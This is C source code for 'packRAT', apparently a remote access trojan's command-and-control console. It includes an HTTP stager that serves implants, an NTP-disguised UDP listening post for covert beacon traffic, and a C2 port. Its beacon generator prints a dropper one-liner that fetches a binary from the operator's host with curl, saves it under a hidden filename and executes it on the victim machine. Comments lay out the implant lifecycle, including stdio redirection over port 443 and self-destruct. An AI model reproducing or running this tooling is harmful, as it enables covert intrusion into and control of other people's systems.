#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <net/if.h>
#include <pthread.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <dirent.h> 




/*
                              $$\       $$$$$$$\   $$$$$$\ $$$$$$$$\ 
                              $$ |      $$  __$$\ $$  __$$\\__$$  __|
 $$$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\ $$ |  $$ |$$ /  $$ |  $$ |   
$$  __$$\  \____$$\ $$  _____|$$ | $$  |$$$$$$$  |$$$$$$$$ |  $$ |   
$$ /  $$ | $$$$$$$ |$$ /      $$$$$$  / $$  __$$< $$  __$$ |  $$ |   
$$ |  $$ |$$  __$$ |$$ |      $$  _$$<  $$ |  $$ |$$ |  $$ |  $$ |   
$$$$$$$  |\$$$$$$$ |\$$$$$$$\ $$ | \$$\ $$ |  $$ |$$ |  $$ |  $$ |   
$$  ____/  \_______| \_______|\__|  \__|\__|  \__|\__|  \__|  \__|   
$$ |                                                                 
$$ |                                                                 
\__|                                                                 


*/

/*
## Steps:

1. Listen on port 80 for HTTP requests
2. When a request comes in, verify that it is an HTTP request and extract the ID
3. Associate the ID to a known implant type
4. Send the implant back to the client
5. Client executes the implant - an NTP beacon which uses ntp-tunnel to wait for commands
6. When the server has a command ready, it tells the beacon to set up a secondary connection over HTTP to request the binary
7. The beacon sends an HTTP request for the binary, which is sent back to the beacon
8. The beacon executes the binary, which reroutes stdin/out/err over TCP port 443
9. The beacon sends the secondary comms channel's IP and port to the server so it can be associated with the implant ID
10. The server caches all incoming traffic on port 443, catalogging it based on remote IP and port (implant ID)
11. User options include 3 modes:
    a. General prompt (generate implants, list sessions, etc.)
    b. Session prompt (run binaries on a specific implant)
    c. Command prompt (interact with a specific binary on a specific implant)


Capabilities required:
- HTTP server
*/

//Regular text
#define BLK "\e[0;30m"
#define RED "\e[0;31m"
#define GRN "\e[0;32m"
#define YEL "\e[0;33m"
#define BLU "\e[0;34m"
#define MAG "\e[0;35m"
#define CYN "\e[0;36m"
#define WHT "\e[0;37m"

//Regular bold text
#define BBLK "\e[1;30m"
#define BRED "\e[1;31m"
#define BGRN "\e[1;32m"
#define BYEL "\e[1;33m"
#define BBLU "\e[1;34m"
#define BMAG "\e[1;35m"
#define BCYN "\e[1;36m"
#define BWHT "\e[1;37m"

//Reset
#define CRESET "\e[0m"

#define NTP_RESPONSE (char[]) {0x24, 0x01, 0x03, 0xed, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x53, 0x48, 0x4d, 0x00, 0xe7, 0x67, 0x93, 0x35, 0x1f, 0x92, 0xd1, 0xda, 0xbf, 0xb5, 0xd2, 0x4c, 0x5c, 0xc0, 0x1c, 0xb0, 0xe7, 0x67, 0x93, 0x3b, 0xb3, 0x39, 0x71, 0x8d, 0xe7, 0x67, 0x93, 0x3b, 0xb3, 0x3c, 0x06, 0xb5}

#define NULL_MSG (char[]) {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}


char listen_ip[16];
int stager_port = 80;
int lp_port = 123;
int c2_port = 443;


int running;
int listening;


typedef struct session {
    unsigned int id;
    char* ip;
    int port;
    char* recv_buf;
    char* send_buf;
    int sock;
} Session;

typedef struct beacon {
    unsigned int id;
    char* type;
    Session* sessions;
    int session_count;
    char* ip;
    int port;
    long last_seen;
    char* notes;
} Beacon;


Beacon* beacons;
int beacon_count = 0;

// Set up initial UDP listener on port 123 bound to any interface
int lp_sock;
struct sockaddr_in lp_addr, lp_req_addr;
socklen_t lp_req_addr_len = sizeof(lp_req_addr);
char recv_msg[60];
char data[1024];

// Set up TCP listener on port 80 bound to any interface
int stage_sock;
struct sockaddr_in stage_addr, stage_req_addr;
socklen_t stage_req_addr_len = sizeof(stage_req_addr);
char stage_req[1024];

// Set up TCP listener on port 443 bound to any interface
int c2_sock;
struct sockaddr_in c2_addr, c2_req_addr;
socklen_t c2_req_addr_len = sizeof(c2_req_addr);
char c2_req[1024];


void print(char* msg) {
    printf(CRESET "  %s\n" CRESET, msg);
}
void error(char* msg) {
    printf(RED "  [ERROR]: %s\n" CRESET, msg);
}
void info (char* msg) {
    printf(BLU "  [INFO]: %s\n" CRESET, msg);
}
void success (char* msg) {
    printf(GRN "  [SUCCESS]: %s\n" CRESET, msg);
}
int promptInt(char* prompt) {
    printf(BMAG "  %s >" CRESET, prompt);
    int i;
    scanf("%d", &i);
    return i;
}
char* promptStr(char* prompt) {
    printf(BMAG "  %s >" CRESET, prompt);
    char* str = malloc(1024);
    scanf("%s", str);
    return str;
}
int clear_input() {
    int c;
    while ((c = getchar()) != '\n' && c != EOF) { }
    return 0;
}
int clear() {
    system("clear");
    return 0;
}


char* select_ip() {
    char* ip = malloc(16);
    char** ips = malloc(16 * 16);
    struct sockaddr_in *s4;
    char buf[64];
    
    for (int i = 0; i < 16; i++) {
        ips[i] = malloc(16);
    }
    struct ifaddrs *myaddrs, *ifa;
    int status;

    status = getifaddrs(&myaddrs);
    if (status != 0){
        perror("getifaddrs failed!");
        exit(1);
    }

    printf("\nSelect an interface to listen on:\n");
    int index = 0;
    for (ifa = myaddrs; ifa != NULL; ifa = ifa->ifa_next) {
        if (NULL == ifa->ifa_addr){
            continue;
        }
        if ((ifa->ifa_flags & IFF_UP) == 0) {
            continue;
        }
        
        if (AF_INET == ifa->ifa_addr->sa_family){
            s4 = (struct sockaddr_in *)(ifa->ifa_addr);
            if (NULL == inet_ntop(ifa->ifa_addr->sa_family, (void *)&(s4->sin_addr), buf, sizeof(buf))){
                printf("  [ERROR]: %s - inet_ntop failed!\n", ifa->ifa_name);
            } else {
                printf("  %d: %s - %s\n", index, ifa->ifa_name, buf);
                strcpy(ips[index], buf);
                index++;
            }
        }
        if (index >= 16) {
            ips = realloc(ips, 16 * (index));
        }
    }
    freeifaddrs(myaddrs);

    printf("  %d: Custom (Enter IP manually)\n", index++);

    printf("\nEnter index of interface selection (0-%d): ", index);
    int selection;
    scanf("%d", &selection);
    clear_input();
    if (selection < 0 || selection >= index) {
        printf("Invalid selection\n");
        select_ip();
    }
    if (selection == index - 1) {
        printf("Enter IP: ");
        scanf("%s", ip);
        return ip;
    }

    strcpy(ip, ips[selection]);
    free(ips);
    return ip;
}
char* select_type() {
    char* type = malloc(256);
    char** types = malloc(256 * 16);
    for (int i = 0; i < 16; i++) {
        types[i] = malloc(16);
    }
    printf("\nSelect a beacon type:\n");
    // List all beacon types from ./src/beacons
    DIR* dir;
    struct dirent* ent;
    int index = 0;
    if ((dir = opendir("./src/beacons")) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0 || (strlen(ent->d_name) > 1 && ent->d_name[strlen(ent->d_name) - 2] == '.')) {
                continue;
            }
            printf("  %d: %s\n", index, ent->d_name);
            strcpy(types[index], ent->d_name);
            index++;
            if (index >= 16) {
                types = realloc(types, 16 * (index));
            }
        }
        closedir(dir);
    } else {
        error("Could not open directory ./src/beacons - please make sure it exists and packRAT is running from the correct directory");
        exit(1);
    }
    index--;
    printf("\nEnter index of beacon type (0-%d): ", index);
    int selection;
    scanf("%d", &selection);
    clear_input();
    if (selection < 0 || selection >= index) {
        printf("Invalid selection\n");
        select_type();
    }
    // Return the selected beacon type
    strcpy(type, types[selection]);
    free(types);
    return type;
}
int set(char* option, char* value) {
    if (strcmp(option, "listen-ip") == 0) {
        strcpy(listen_ip, value);
        return 0;
    }
    if (strcmp(option, "stage-port") == 0) {
        lp_port = atoi(value);
        return 0;
    }
    if (strcmp(option, "lp-port") == 0) {
        lp_port = atoi(value);
        return 0;
    }
    if (strcmp(option, "c2-port") == 0) {
        c2_port = atoi(value);
        return 0;
    }
    printf("Invalid option\n");
    return -1;
}

int banner() {
    // Clear the screen
    clear();
    // Print the banner
    printf(BBLU "\n");
    printf("                              $$\\       $$$$$$$\\   $$$$$$\\ $$$$$$$$\\ \n");
    printf("                              $$ |      $$  __$$\\ $$  __$$\\\\__$$  __|\n");
    printf(" $$$$$$\\   $$$$$$\\   $$$$$$$\\ $$ |  $$\\ $$ |  $$ |$$ /  $$ |  $$ |   \n");
    printf("$$  __$$\\  \\____$$\\ $$  _____|$$ | $$  |$$$$$$$  |$$$$$$$$ |  $$ |   \n");
    printf("$$ /  $$ | $$$$$$$ |$$ /      $$$$$$  / $$  __$$< $$  __$$ |  $$ |   \n");
    printf("$$ |  $$ |$$  __$$ |$$ |      $$  _$$<  $$ |  $$ |$$ |  $$ |  $$ |   \n");
    printf("$$$$$$$  |\\$$$$$$$ |\\$$$$$$$\\ $$ | \\$$\\ $$ |  $$ |$$ |  $$ |  $$ |   \n");
    printf("$$  ____/  \\_______| \\_______|\\__|  \\__|\\__|  \\__|\\__|  \\__|  \\__|   \n");
    printf("$$ |                                                                 \n");
    printf("$$ |                                                                 \n");
    printf("\\__|                                                                 \n");
    printf("\n");
    printf("\n" CRESET);
    return 0;
}
int help() {
    printf(BCYN "  COMMANDS: \n" CYN);
    printf("    help - Show this help menu\n");
    printf("    b[eacon] - Generate a new beacon implant and print dropper command\n");
    printf("    ls - List all active beacons\n");
    printf("    use <id> - enter session mode for beacon (to execute commands on it)\n");
    printf("    burn <id> - Burn a beacon (self-destruct and clean up)\n");
    printf("    listen - Select IP to listen on and start listening\n");
    printf("    exit - Exit the console\n");
    printf("\n" CRESET);
    return 0;
}
int status() {
    printf("  [STATUS]\n");
    if (stage_sock) {
        printf(GRN "    Stager: listening on %s:%d\n" CRESET, listen_ip, stager_port);
    } else {
        printf(YEL "    Stager: Not running\n" CRESET);
    }
    if (lp_sock) {
        printf(GRN "    LP: listening on %s:%d\n" CRESET, listen_ip, lp_port);
    } else {
        printf(YEL "    LP: Not running\n" CRESET);
    }
    if (c2_sock) {
        printf(GRN "    C2: listening on %s:%d\n" CRESET, listen_ip, c2_port);
    } else {
        printf(YEL "    C2: Not running\n" CRESET);
    }
    return 0;
}


int stager_req_id(char* req) {
    if (strlen(req) < 5 || strncmp(req, "GET /", 5) != 0) {
        return -1;
    }
    return atoi(req + 6);
}
char* stager_req_ip(char* req) {
    char* r = malloc(strlen(req) + 1);
    strcpy(r, req);
    r = strtok(r, " ");
    r = strtok(NULL, " ");
    r = strtok(NULL, " ");
    r = strtok(NULL, " ");
    r = strtok(r, "\n");
    return r;
}
char* load_beacon(char* type, int id) {
    char* path = malloc(256 + 8);
    strcpy(path, "./src/beacons/");
    strcat(path, type);
    FILE* f = fopen(path, "r");
    if (f == NULL) {
        error("Beacon could not be loaded\n");
        return NULL;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    char* beacon = malloc(fsize + 1);
    fread(beacon, fsize, 1, f);
    fclose(f);
    free(path);
    beacon[fsize] = 0;

    // Replace any occurances of ${C2_IP} with host and ${C2_PORT} with lp_port
    int int_placeholder = 12345;
    char* str_c2_port = malloc(6);
    sprintf(str_c2_port, "%d", c2_port);
    char* str_lp_port = malloc(6);
    sprintf(str_lp_port, "%d", lp_port);
    for (int i = 0; i < fsize - 15; i++) {
        if (strncmp(beacon + i, "${C2_IP_XXXXXX}", 15) == 0 || strncmp(beacon + i, "XXX.XXX.XXX.XXX", 15) == 0) {
            memcpy(beacon + i, listen_ip, strlen(listen_ip));
            memcpy(beacon + i + strlen(listen_ip), beacon + i + 15, fsize - i - 15);
            beacon[fsize - 15 + strlen(listen_ip)] = 0;
        }
    }
    for (int i = 0; i < fsize - 10; i++) {
        if (strncmp(beacon + i, "${C2_PORT}", 10) == 0) {
            memcpy(beacon + i, str_c2_port, strlen(str_c2_port));
            memcpy(beacon + i + strlen(str_c2_port), beacon + i + 10, fsize - i - 10);
            beacon[fsize - 10 + strlen(str_c2_port)] = 0;
        }
    }
    for (int i = 0; i < fsize - 10; i++) {
        if (strncmp(beacon + i, "${LP_PORT}", 10) == 0) {
            memcpy(beacon + i, str_lp_port, strlen(str_lp_port));
            memcpy(beacon + i + strlen(str_lp_port), beacon + i + 10, fsize - i - 10);
            beacon[fsize - 10 + strlen(str_lp_port)] = 0;
        }
    }
    for (int i = 0; i < fsize - 4; i++) {
        if (memcmp(beacon + i, &int_placeholder, 4) == 0) {
            memcpy(beacon + i, &lp_port, 4);
        }
    }
    int_placeholder = 54321;
    for (int i = 0; i < fsize - 4; i++) {
        if (memcmp(beacon + i, &int_placeholder, 4) == 0) {
            memcpy(beacon + i, &id, 4);
        }
    }
    return beacon;
}

char* gen_stager_resp(int id, char* host) {
    if (id < 0 || id > beacon_count) {
        char* resp = malloc(256);
        strcpy(resp, "HTTP/1.1 404 Not Found\r\n\r\n");
        error("Invalid beacon ID\n");
        return resp;
    }
    char* beacon = load_beacon(beacons[id].type, id);
    if (beacon == NULL) {
        char* resp = malloc(256);
        strcpy(resp, "HTTP/1.1 404 Not Found\r\n\r\n");
        error("Beacon could not be loaded\n");
        return resp;
    }
    char* resp = malloc(strlen(beacon) + 24);
    strcpy(resp, "HTTP/1.1 200 OK\r\n\r\n");
    strcat(resp, beacon);
    resp[strlen(beacon) + 24] = 0;
    free(beacon);
    fflush(stdout);
    return resp;
}


int init_stager() {
    // Create TCP socket
    stage_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(stage_sock < 0){
        printf("Problem while creating staging socket\n");
        return -1;
    }

    int bind_succes = 0;

    // Set port and IP:
    stage_addr.sin_family = AF_INET;
    stage_addr.sin_port = htons(stager_port);
    stage_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind to the set port and IP:
    while(bind(stage_sock, (const struct sockaddr*)&stage_addr, stage_req_addr_len) < 0){
        printf(RED "  [ERROR]:   Stager couldn't bind to port %d, trying port %d\n" CRESET, stager_port, stager_port + 1);
        fflush(stdout);
        stager_port++;
        if (stager_port == 90) {
            stager_port = 8080;
        }
        if (stager_port == 8090) {
            printf("Port bind failed\n");
            return -1;
        }
        stage_addr.sin_port = htons(stager_port);
    }
    printf(GRN "  [SUCCESS]: Stager bound to port %d\n" CRESET, stager_port);
    fflush(stdout);
    return 0;
}
void *stager_loop(void *vargp) {
    while (running) {
        // Listen for incoming connections:
        if(listen(stage_sock, 1) < 0){
            perror("Problem while listening");
            continue;
        }
        // Accept incoming connection:
        int conn = accept(stage_sock, (struct sockaddr*)&stage_req_addr, &stage_req_addr_len);
        if(conn < 0){
            perror("Problem while accepting connection");
            continue;
        }
        // Receive HTTP request:
        int recv_len = recvfrom(conn, stage_req, 1024, 0, (struct sockaddr*)&stage_req_addr, &stage_req_addr_len);
        if(recv_len < 0){
            perror("Problem while receiving message");
            continue;
        }
        stage_req[recv_len] = 0;
        // Parse HTTP request
        int id = stager_req_id(stage_req);
        if (id < 0) {
            // Invalid request
            continue;
        }
        char* host = stager_req_ip(stage_req);
        // Respond with an implant matching the requested ID with the correct host
        char* resp = gen_stager_resp(id, host);

        // Send response:
        stage_req_addr_len = sizeof(stage_req_addr);
        if(sendto(conn, resp, strlen(resp), 0, (struct sockaddr*)&stage_req_addr, stage_req_addr_len) < 0){
            perror("Problem while sending message");
            continue;
        }
        // Close connection:
        close(conn);
        printf(BLU "  [INFO]: Stager requested using ID %d from host %s\n" CRESET, id, host);
    }
    info("  Stager thread exiting\n");
    return NULL;
}


int init_lp() {
    // Create UDP socket:
    lp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(lp_sock < 0){
        error("Problem while creating lp socket\n");
        return -1;
    }

    int lp_port = 123;
    int bind_succes = 0;

    // Set port and IP:
    lp_addr.sin_family = AF_INET;
    lp_addr.sin_port = htons(123);
    lp_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind to the set port and IP:
    while(bind(lp_sock, (struct sockaddr*)&lp_addr, sizeof(lp_addr)) < 0){
        printf(RED "  [ERROR]: LP couldn't bind to port %d, trying port %d\n" CRESET, lp_port, lp_port + 1);
        fflush(stdout);
        lp_port++;
        if (lp_port == 133) {
            error("LP port bind failed\n");
            return -1;
        }
        lp_addr.sin_port = htons(lp_port);
    }
    printf(GRN "  [SUCCESS]: LP bound to port %d\n" CRESET, lp_port);
    return 0;
}
void *lp_loop(void *vargp) {
    while (running) {
        int i = 0;
        int recv_len = 0;
        do {
            i += recv_len;
            // Receive NTP message:
            recv_len = recvfrom(lp_sock, recv_msg, 60, 0, (struct sockaddr*)&lp_req_addr, &lp_req_addr_len);
            if(recv_len < 0){
                error("Problem while receiving message\n");
                continue;
            }
            memcpy(data + i, recv_msg + 52, recv_len - 52);
        } while(memcmp(data + i, NULL_MSG, 8) != 0);
        printf("\n%s\n", data);
        fflush(stdout);
    }
    info("  LP thread exiting\n");
    return NULL;
}

int start_listeners() {
    strcpy(listen_ip, select_ip());

    // Initialize the stager
    if (init_stager() < 0) {
        error("Stager initialization failed");
        return -1;
    }

    // Initialize the lp
    if (init_lp() < 0) {
        error("LP initialization failed");
        return -1;
    }

    // Launch the stager
    pthread_t stager_thread;
    pthread_create(&stager_thread, NULL, stager_loop, NULL);

    // Launch the lp
    pthread_t lp_thread;
    pthread_create(&lp_thread, NULL, lp_loop, NULL);

    listening = 1;

    return 0;
}
int generate_beacon() {
    if (!listening) {
        printf(RED "  [ERROR]: You must start listening before generating a beacon\n" CRESET);
        printf(BLU "  [INFO]: Use the 'listen' command to start listening\n" CRESET);
        return -1;
    }

    beacons = realloc(beacons, sizeof(struct beacon) * (beacon_count + 1));
    beacons[beacon_count].id = beacon_count;
    beacons[beacon_count].last_seen = 0;
    beacons[beacon_count].port = 0;
    beacons[beacon_count].notes = malloc(1024);
    beacons[beacon_count].notes[0] = 0;
    beacons[beacon_count].type = malloc(256);
    beacons[beacon_count].type = select_type();
    beacons[beacon_count].ip = malloc(16);
    beacons[beacon_count].ip[0] = 0;
    beacons[beacon_count].sessions = NULL;
    beacons[beacon_count].session_count = 0;

    printf(BLU "  [INFO]: Beacon generated for %s with ID %d\n" CRESET, beacons[beacon_count].type, beacons[beacon_count].id);
    printf(BLU "          Copy the following command into the remote system to install the beacon:\n\n" CRESET);
    printf(BBLU "          curl %s:%d/%d > ., && chmod +x ., && ./.,\n\n" CRESET, listen_ip, stager_port, beacons[beacon_count].id);
    beacon_count++;

    return 0;
}
int list_beacons() {
    if (beacon_count == 0) {
        printf("  No beacons - use the b[eacon] command to generate beacons\n\n");
        return 0;
    }
    for (int i = 0; i < beacon_count; i++) {
        if (!i) {
            printf("  Active beacons:\n");
        }
        if (beacons[i].last_seen > 0) {
            printf("    %d: %s:%d (%s) - seen %lus ago \n", i, beacons[i].ip, beacons[i].port, beacons[i].type, time(NULL) - beacons[i].last_seen);
        }
        printf("  %d: %s\n", i, beacons[i].ip);
    }
    for (int i = 0; i < beacon_count; i++) {
        if (!i) {
            printf("  Inactive beacons:\n");
        }
        if (beacons[i].last_seen == 0) {
            printf("    %d: %s:%d (%s)\n", i, beacons[i].ip, beacons[i].port, beacons[i].type);
        }
    }
    printf("\n");
    return 0;
}


int prompt() {
    // Print the prompt
    printf(BRED "(packRAT)>> " CRESET);

    // Read the input
    char input[256];
    fgets(input, 256, stdin);

    // Execute the command
    if (strcmp(input, "\n") == 0) {
        return 0;
    } else if (strcmp(input, "help\n") == 0) {
        help();
    } else if (strcmp(input, "clear\n") == 0) {
        clear();
    } else if (strcmp(input, "status\n") == 0) {
        status();
    } else if (strcmp(input, "listen\n") == 0) {
        start_listeners();
    } else if (strcmp(input, "b\n") == 0 || strcmp(input, "beacon\n") == 0) {
        generate_beacon();
    } else if (strcmp(input, "ls\n") == 0) {
        list_beacons();
    } else if (strcmp(input, "exit\n") == 0) {
        printf("Goodbye!\n\n");
        return 1;
    } else {
        printf(RED "  [ERROR]: Unknown command: %s" CRESET, input);
    }
    return 0;
}

int console() {
    // Print the header
    banner();

    while(!prompt());

    return 0;
}



int main() {
    // Initialize running semaphore
    running = 1;

    // Launch the console
    return console();
}